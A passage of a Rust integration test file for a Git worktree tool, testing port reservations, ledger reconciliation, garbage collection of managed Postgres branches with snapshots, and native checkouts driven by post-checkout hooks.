        devflow_core::ports::ensure_with(&project, &other.workspace, &mut receipt, &|_| true);
    assert_eq!(
        ensured.port, None,
        "the moved checkout's port is not free to take"
    );
    // Seen again at its new place, the reservation follows it.
    let moved_ws = ws(&t.project, "moving");
    assert_eq!(
        moved_ws.path.canonicalize().unwrap(),
        to.canonicalize().unwrap()
    );
    let mut kept = receipt_of(&moved_ws);
    let ensured = devflow_core::ports::ensure(&t.project, &moved_ws, &mut kept);
    assert_eq!(ensured.port, Some(port));
    assert!(ensured.warnings.is_empty(), "{:?}", ensured.warnings);
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn managed_postgres_gc_removes_the_database_of_a_worktree_git_forgot() {
    use devflow_core::gc;
    let t = repo(&Hooks::default(), MANAGED);
    let _cleanup = managed_cleanup(&t.project);
    let empty = || SetupOptions {
        data_from: Some(DataSource::Empty),
        ..Default::default()
    };
    let kept = create(&t.project, "kept", empty()).unwrap();
    let gone = create(&t.project, "gone", empty()).unwrap();
    assert_eq!(gone.status, Status::Ready, "{:?}", gone.receipt.phases);
    let kept_branch = binding(&kept.receipt).branch_id.unwrap();
    let branch = binding(&gone.receipt).branch_id.unwrap();
    let server = devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap();
    assert!(server.branch(branch).unwrap().is_some());

    // What an agent host does when it is done: remove the worktree. The
    // receipt goes with it; the record in the ledger is what still names the
    // branch.
    worktree::force_remove(&t.project, &gone.workspace).unwrap();
    assert!(!gone.workspace.git_dir.exists());
    assert_eq!(
        gc::summary(&t.project).unwrap().removed_elsewhere,
        ["gone"],
        "list and doctor see it from files alone"
    );

    let inventory = gc::inventory(&t.project, &gc::Options::default()).unwrap();
    let entry = inventory.entry(gone.receipt.instance_id).unwrap();
    assert_eq!(entry.class, gc::Class::RemovedElsewhere, "{entry:?}");
    assert!(entry.removable);
    assert_eq!(entry.branches.len(), 1);
    assert_eq!(entry.branches[0].presence, gc::Presence::Owned);
    assert!(
        entry.branches[0].size_bytes.is_some_and(|size| size > 0),
        "the size is measured: {:?}",
        entry.branches[0]
    );
    assert!(entry.merge.is_some());
    assert_eq!(
        inventory.entry(kept.receipt.instance_id).unwrap().class,
        gc::Class::Active
    );

    let outcome = gc::remove(
        &t.project,
        &gc::RemoveRequest {
            targets: vec![entry.target().unwrap()],
            snapshot: true,
            pitchfork: Some(quiet_pitchfork()),
            ..Default::default()
        },
        &mut |_| {},
    )
    .unwrap();
    assert_eq!(outcome.removed.len(), 1, "{:?}", outcome.skipped);
    let removed = &outcome.removed[0];
    assert_eq!(removed.snapshots.len(), 1, "{removed:?}");
    assert!(
        removed.snapshots[0].starts_with("database/gc-gone-"),
        "{removed:?}"
    );
    assert_eq!(removed.dropped.len(), 1, "{removed:?}");
    assert!(
        server.branch(branch).unwrap().is_none(),
        "the database branch is gone"
    );
    assert!(
        server.branch(kept_branch).unwrap().is_some(),
        "the other workspace's branch is untouched"
    );
    assert!(
        server
            .list_snapshots()
            .unwrap()
            .iter()
            .any(|snapshot| snapshot.name.starts_with("gc-gone-")),
        "the snapshot taken first is kept"
    );
    assert!(
        devflow_core::ledger::list(&t.project.git_common_dir)
            .unwrap()
            .records
            .iter()
            .all(|record| record.workspace != "gone"),
        "everything was accounted for: the record is gone"
    );
    assert!(gc::summary(&t.project).unwrap().is_empty());
}

/// A workspace Git forgot, with a database branch, as the first of a pair of
/// workspaces on a managed server.
fn forgotten_with_a_branch(t: &Repo, name: &str) -> (devflow_core::receipt::Receipt, uuid::Uuid) {
    let created = create(
        &t.project,
        name,
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(
        created.status,
        Status::Ready,
        "{:?}",
        created.receipt.phases
    );
    let branch = binding(&created.receipt).branch_id.unwrap();
    worktree::force_remove(&t.project, &created.workspace).unwrap();
    (created.receipt, branch)
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn managed_postgres_gc_snapshots_a_branch_recorded_before_its_creation_finished() {
    use devflow_core::gc;
    let t = repo(&Hooks::default(), MANAGED);
    let _cleanup = managed_cleanup(&t.project);
    let (receipt, branch) = forgotten_with_a_branch(&t, "pending");
    // What a crash between recording the branch and binding it leaves: the
    // record lists it as pending, and the backend has it ready.
    let path = devflow_core::ledger::path(&t.project.git_common_dir, receipt.instance_id);
    let mut record: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap();
    record["resources"]["branches"][0]["pending"] = true.into();
    std::fs::write(&path, serde_json::to_vec_pretty(&record).unwrap()).unwrap();

    let inventory = gc::inventory(&t.project, &gc::Options::default()).unwrap();
    let entry = inventory.entry(receipt.instance_id).unwrap();
    assert!(entry.removable, "{entry:?}");
    assert!(entry.branches[0].pending);
    assert_eq!(entry.branches[0].presence, gc::Presence::Owned);
    assert_eq!(entry.branches[0].ready, Some(true));

    let outcome = gc::remove(
        &t.project,
        &gc::RemoveRequest {
            targets: vec![entry.target().unwrap()],
            snapshot: true,
            pitchfork: Some(quiet_pitchfork()),
            ..Default::default()
        },
        &mut |_| {},
    )
    .unwrap();
    assert_eq!(outcome.removed.len(), 1, "{:?}", outcome.skipped);
    assert_eq!(
        outcome.removed[0].snapshots.len(),
        1,
        "a pending branch the backend has ready is snapshotted: {:?}",
        outcome.removed[0]
    );
    let server = devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap();
    assert!(server.branch(branch).unwrap().is_none());
    assert!(
        server
            .list_snapshots()
            .unwrap()
            .iter()
            .any(|snapshot| snapshot.name.starts_with("gc-pending-"))
    );
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn managed_postgres_gc_never_drops_data_that_a_reset_replaced_after_it_was_shown() {
    use devflow_core::{db::ResolvedSource, gc};
    let t = repo(&Hooks::default(), MANAGED);
    let _cleanup = managed_cleanup(&t.project);
    let (receipt, branch) = forgotten_with_a_branch(&t, "reset-since");
    let server = devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap();

    let inventory = gc::inventory(&t.project, &gc::Options::default()).unwrap();
    let shown = inventory
        .entry(receipt.instance_id)
        .unwrap()
        .target()
        .unwrap();
    assert!(
        shown
            .backend
            .iter()
            .any(|b| b.id == branch && b.generation.is_some()),
        "the generation the person was shown travels with the request: {shown:?}"
    );

    // Somebody resets the branch meanwhile: same id, same owner, new data.
    server
        .reset_branch(branch, ResolvedSource::Empty)
        .expect("the reset");
    for snapshot in [false, true] {
        let outcome = gc::remove(
            &t.project,
            &gc::RemoveRequest {
                targets: vec![shown.clone()],
                snapshot,
                pitchfork: Some(quiet_pitchfork()),
                ..Default::default()
            },
            &mut |_| {},
        )
        .unwrap();
        assert!(outcome.removed.is_empty(), "snapshot={snapshot}");
        assert!(
            outcome.skipped[0]
                .reason
                .contains("not the data that was shown"),
            "snapshot={snapshot}: {:?}",
            outcome.skipped
        );
        assert!(
            server.branch(branch).unwrap().is_some(),
            "the reset data is still there (snapshot={snapshot})"
        );
    }
    // What is shown now is what a removal drops.
    let again = gc::inventory(&t.project, &gc::Options::default()).unwrap();
    let outcome = gc::remove(
        &t.project,
        &gc::RemoveRequest {
            targets: vec![again.entry(receipt.instance_id).unwrap().target().unwrap()],
            pitchfork: Some(quiet_pitchfork()),
            ..Default::default()
        },
        &mut |_| {},
    )
    .unwrap();
    assert_eq!(outcome.removed.len(), 1, "{:?}", outcome.skipped);
    assert!(server.branch(branch).unwrap().is_none());
}

fn instances_holding_ports() -> Vec<uuid::Uuid> {
    devflow_core::ports::reserved()
        .into_iter()
        .map(|(_, _, instance)| instance)
        .collect()
}

#[cfg(unix)]
#[test]
fn the_old_identitys_port_stays_until_the_replacement_is_durable() {
    use std::os::unix::fs::PermissionsExt;
    let t = plain();
    let w = create(&t.project, "swap", SetupOptions::default()).unwrap();
    let old = w.receipt.instance_id;
    let dir = w.workspace.git_dir.join("devflow");
    // The replacement receipt cannot be written: the old one stays the
    // checkout's, and so does its port.
    std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o555)).unwrap();
    let denied = std::fs::File::create(dir.join("probe")).is_ok();
    let failed = setup::setup(
        &t.project,
        &w.workspace,
        SetupOptions::default(),
        false,
        true,
        &mut NoProgress,
    );
    std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o755)).unwrap();
    if denied {
        return; // (running as a user the permission does not stop)
    }
    assert!(failed.is_err());
    assert_eq!(receipt_of(&w.workspace).instance_id, old);
    assert!(instances_holding_ports().contains(&old), "still reserved");

    // The replacement lands but the release never ran (a crash, a lock that
    // timed out): nothing at this path carries the old identity any more, so
    // the next reconciliation of the ledger drops it.
    let mut replaced = receipt_of(&w.workspace);
    replaced.instance_id = uuid::Uuid::new_v4();
    replaced.app_port = None;
    replaced.save(&w.workspace.git_dir).unwrap();
    assert!(
        !instances_holding_ports().contains(&old),
        "retired by reconciliation"
    );
}

#[test]
fn a_reused_path_does_not_inherit_a_removed_workspaces_reservation() {
    let t = plain();
    let first = create(&t.project, "reused", SetupOptions::default()).unwrap();
    let old = first.receipt.instance_id;
    // The host removes the workspace behind devflow's back and makes another
    // at the same path.
    let git = |args: &[&str]| {
        let out = std::process::Command::new("git")
            .current_dir(&t.root)
            .args(args)
            .output()
            .expect("git");
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    };
    git(&[
        "worktree",
        "remove",
        "--force",
        first.workspace.path.to_str().unwrap(),
    ]);
    let second = create(&t.project, "reused", SetupOptions::default()).unwrap();
    assert_eq!(second.workspace.path, first.workspace.path);
    assert_ne!(second.receipt.instance_id, old);
    assert!(
        !instances_holding_ports().contains(&old),
        "the directory exists, but its owner is another identity"
    );
    assert!(instances_holding_ports().contains(&second.receipt.instance_id));
}

#[test]
fn an_unreadable_ledger_is_refused_not_started_again() {
    if !in_child("an_unreadable_ledger_is_refused_not_started_again", &[]) {
        return;
    }
    let t = plain();
    let a = create(&t.project, "a", SetupOptions::default()).unwrap();
    let ledger = devflow_core::paths::data_dir()
        .unwrap()
        .join("ports/ledger.json");
    std::fs::write(&ledger, "{ this is not json").unwrap();
    // gc's release by identity does not touch a ledger it cannot read either.
    devflow_core::ports::release_instance(t.project.id(), a.receipt.instance_id);
    // A workspace that needs a port is not given one from a ledger nobody can
    // read: A's server is stopped, and a bind check could not tell.
    let b = create(&t.project, "b", SetupOptions::default()).unwrap();
    assert_eq!(b.receipt.app_port, None);
    let warning = b.warnings.join("\n");
    assert!(
        warning.contains("ledger.json") && warning.contains("cannot be read"),
        "{warning}"
    );
    assert!(
        b.remedies.iter().any(|r| matches!(r, devflow_core::remedy::Remedy::OpenFile { path } if path.ends_with("ledger.json"))),
        "{:?}",
        b.remedies
    );
    assert_eq!(
        std::fs::read_to_string(&ledger).unwrap(),
        "{ this is not json",
        "left as it was"
    );
    assert!(!ledger.with_extension("json.unreadable").exists());
    // A port a workspace already has is kept regardless.
    let again = setup::activate(
        &t.project,
        &a.workspace,
        SetupOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(again.receipt.app_port, a.receipt.app_port);
    // Once the file is dealt with, allocation works again.
    std::fs::remove_file(&ledger).unwrap();
    let mut receipt = receipt_of(&b.workspace);
    let ensured = devflow_core::ports::ensure(&t.project, &b.workspace, &mut receipt);
    assert!(ensured.allocated && ensured.port.is_some(), "{ensured:?}");
}

#[test]
fn the_same_instance_id_in_two_projects_is_two_reservations() {
    let a = plain();
    let b = plain();
    let mut project_a = a.project.clone();
    let mut project_b = b.project.clone();
    project_a.config.worktree.port_range = Some([47200, 47200]);
    project_b.config.worktree.port_range = Some([47200, 47200]);
    let wa = create(&a.project, "wa", SetupOptions::default())
        .unwrap()
        .workspace;
    let wb = create(&b.project, "wb", SetupOptions::default())
        .unwrap()
        .workspace;
    let clear = |project: &Project, w: &Workspace, instance: Option<uuid::Uuid>| {
        let mut receipt = receipt_of(w);
        devflow_core::ports::release(project.id(), receipt.instance_id, &w.path);
        receipt.app_port = None;
        if let Some(instance) = instance {
            receipt.instance_id = instance;
        }
        receipt.save(&w.git_dir).unwrap();
        receipt
    };
    let mut ra = clear(&a.project, &wa, None);
    // An orchestrator gave both projects' workspaces the same instance id.
    let mut rb = clear(&b.project, &wb, Some(ra.instance_id));
    let got = devflow_core::ports::ensure_with(&project_a, &wa, &mut ra, &|_| true);
    assert_eq!(got.port, Some(47200));
    // B is not A: the one port in range is taken, not "its own".
    let got = devflow_core::ports::ensure_with(&project_b, &wb, &mut rb, &|_| true);
    assert_eq!(got.port, None, "{got:?}");
    // And releasing B's identity leaves A's reservation alone.
    devflow_core::ports::release(b.project.id(), rb.instance_id, &wb.path);
    assert!(
        devflow_core::ports::reserved()
            .iter()
            .any(|(p, project, i)| *p == 47200
                && *project == a.project.id()
                && *i == ra.instance_id)
    );
}

#[test]
fn a_moved_workspace_keeps_its_port_when_another_takes_its_old_path() {
    let t = plain();
    let a = create(&t.project, "mover", SetupOptions::default()).unwrap();
    let (old_path, instance, port) = (
        a.workspace.path.clone(),
        a.receipt.instance_id,
        a.receipt.app_port.unwrap(),
    );
    let to = old_path.with_file_name("mover-moved");
    let out = std::process::Command::new("git")
        .current_dir(&t.root)
        .args(["worktree", "move"])
        .arg(&old_path)
        .arg(&to)
        .output()
        .expect("git");
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    // Another workspace is registered at the old path before A's entry was
    // ever refreshed.
    let added = std::process::Command::new("git")
        .current_dir(&t.root)
        .args(["worktree", "add", "-b", "newcomer"])
        .arg(&old_path)
        .output()
        .expect("git");
    assert!(
        added.status.success(),
        "{}",
        String::from_utf8_lossy(&added.stderr)
    );
    let adopted = ws(&t.project, "newcomer");
    assert_eq!(
        adopted.path.canonicalize().unwrap(),
        old_path.canonicalize().unwrap()
    );
    let b = setup::setup(
        &t.project,
        &adopted,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .expect("adopted");
    assert_ne!(b.receipt.instance_id, instance);
    // A's identity is carried at its new place: the reservation stays A's.
    let holders = |instance| {
        devflow_core::ports::reserved()
            .iter()
            .filter(|(p, _, i)| *i == instance && *p == port)
            .count()
    };
    assert_eq!(holders(instance), 1, "kept, and not duplicated");
    // B, allocating from a range of exactly A's port, cannot have it.
    let mut project = t.project.clone();
    project.config.worktree.port_range = Some([port, port]);
    let mut receipt = receipt_of(&b.workspace);
    devflow_core::ports::release(t.project.id(), receipt.instance_id, &b.workspace.path);
    receipt.app_port = None;
    receipt.save(&b.workspace.git_dir).unwrap();
    let got = devflow_core::ports::ensure_with(&project, &b.workspace, &mut receipt, &|_| true);
    assert_eq!(got.port, None, "{got:?}");
    // A keeps its port, now recorded at the place it is.
    let moved = ws(&t.project, "mover");
    let mut kept = receipt_of(&moved);
    assert_eq!(kept.instance_id, instance);
    let got = devflow_core::ports::ensure(&t.project, &moved, &mut kept);
    assert_eq!(got.port, Some(port));
    assert!(got.warnings.is_empty(), "{:?}", got.warnings);
    assert_eq!(holders(instance), 1);
}

#[test]
fn a_duplicate_reservation_of_one_identity_is_deduplicated() {
    let t = plain();
    let a = create(&t.project, "orig2", SetupOptions::default()).unwrap();
    let b = create(&t.project, "copy2", SetupOptions::default()).unwrap();
    let instance = a.receipt.instance_id;
    let mut copy = receipt_of(&b.workspace);
    copy.instance_id = instance;
    copy.app_port = a.receipt.app_port;
    copy.save(&b.workspace.git_dir).unwrap();
    devflow_core::ports::ensure(&t.project, &b.workspace, &mut copy);
    let holders = || {
        devflow_core::ports::reserved()
            .iter()
            .filter(|(_, _, i)| *i == instance)
            .count()
    };
    assert_eq!(holders(), 2);
    // The copy takes a new identity and never gives its reservation up.
    copy.instance_id = uuid::Uuid::new_v4();
    copy.app_port = None;
    copy.save(&b.workspace.git_dir).unwrap();
    assert_eq!(holders(), 1, "the original's reservation is the one left");
}

/// A repository that checks worktrees out with Git, whose `post-checkout`
/// hook is `script`.
#[cfg(unix)]
fn native_repo_with_hook(script: &str) -> Repo {
    use std::os::unix::fs::PermissionsExt;
    let t = plain();
    let hooks = t.root.join(".git/hooks");
    std::fs::create_dir_all(&hooks).unwrap();
    let hook = hooks.join("post-checkout");
    std::fs::write(&hook, format!("#!/bin/sh\n{script}\n")).unwrap();
    std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
    std::fs::write(
        t.root.join("devflow.local.toml"),
        "[worktree]\ncheckout = \"git\"\n",
    )
    .unwrap();
    let project = Project::open(&t.root).unwrap();
    Repo { project, ..t }
}

#[cfg(unix)]
fn git_runs() -> bool {
    std::process::Command::new("git")
        .arg("--version")
        .output()
        .map(|out| out.status.success())
        .unwrap_or(false)
}

#[cfg(unix)]
#[test]
fn a_native_checkout_is_recorded_and_sets_the_worktree_up_once() {
    if !git_runs() {
        eprintln!("skipped: no git on PATH");
        return;
    }
    let t = native_repo_with_hook(
        "echo \"$DEVFLOW_SETUP_ACTIVE\" >> \"$(git rev-parse --git-common-dir)/hook-ran\"",
    );
    let out = create(&t.project, "native", SetupOptions::default()).unwrap();
    assert_eq!(out.status, Status::Ready);
    let checkout = out.checkout.as_ref().expect("the backend is reported");
    assert_eq!(checkout.backend, devflow_core::config::CheckoutBackend::Git);
    let detail = out
        .receipt
        .phase(Phase::Materialize)
        .detail
        .clone()
        .unwrap_or_default();
    assert!(detail.contains("checked out by Git"), "{detail}");
    // Git ran the hook once, with devflow's re-entry guard set.
    let ran = std::fs::read_to_string(t.root.join(".git/hook-ran")).unwrap();
    assert_eq!(ran.trim(), "1");
    assert!(out.workspace.path.join("README.md").is_file());
    let json = serde_json::to_value(&out).unwrap();
    assert_eq!(json["checkout"]["backend"], "git");
}

#[cfg(unix)]
#[test]
fn a_native_checkout_that_failed_after_the_checkout_is_resumed_by_its_identity() {
    if !git_runs() {
        eprintln!("skipped: no git on PATH");
        return;
    }
    // The hook fails once (Git reports the failure, keeps the worktree), then
    // works: the person fixed whatever it complained about.
    let t = native_repo_with_hook(
        "dir=\"$(git rev-parse --git-common-dir)\"; \
         if [ ! -e \"$dir/hook-fixed\" ]; then echo 'hook refuses' >&2; exit 1; fi",
    );
    let error = create(&t.project, "resumed", SetupOptions::default()).unwrap_err();
    let problem = error
        .downcast_ref::<devflow_core::remedy::Problem>()
        .expect("typed");
    assert!(problem.message.contains("hook refuses"), "{problem:?}");
    let path = worktree::path_for(&t.project, "resumed");
    assert!(
        problem
            .remedies
            .contains(&devflow_core::remedy::Remedy::Setup {
                workspace: path.clone()
            }),
        "{problem:?}"
    );
    // The branch and the worktree survived; libgit2 made nothing instead.
    assert!(path.join("README.md").is_file());
    let survivor = ws(&t.project, "resumed");
    assert_eq!(survivor.branch.as_deref(), Some("resumed"));
    assert!(Receipt::load(&survivor.git_dir).unwrap().is_none());

    // Running the creation again finds the checkout by its identity and
    // points at setting it up; it does not make another or fall back.
    let again = create(&t.project, "resumed", SetupOptions::default()).unwrap_err();
    let again = again
        .downcast_ref::<devflow_core::remedy::Problem>()
        .expect("typed");
    assert!(again.message.contains("has not set it up"), "{again:?}");
    assert!(
        again
            .remedies
            .contains(&devflow_core::remedy::Remedy::Setup {
                workspace: survivor.path.clone()
            })
    );

    // Setting it up resumes: the checkout's own worktree, one receipt.
    std::fs::write(t.root.join(".git/hook-fixed"), "").unwrap();
    let out = setup::setup(
        &t.project,
        &survivor,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert_eq!(out.workspace.path, survivor.path);
    assert_eq!(receipt_of(&survivor).workspace, "resumed");
}
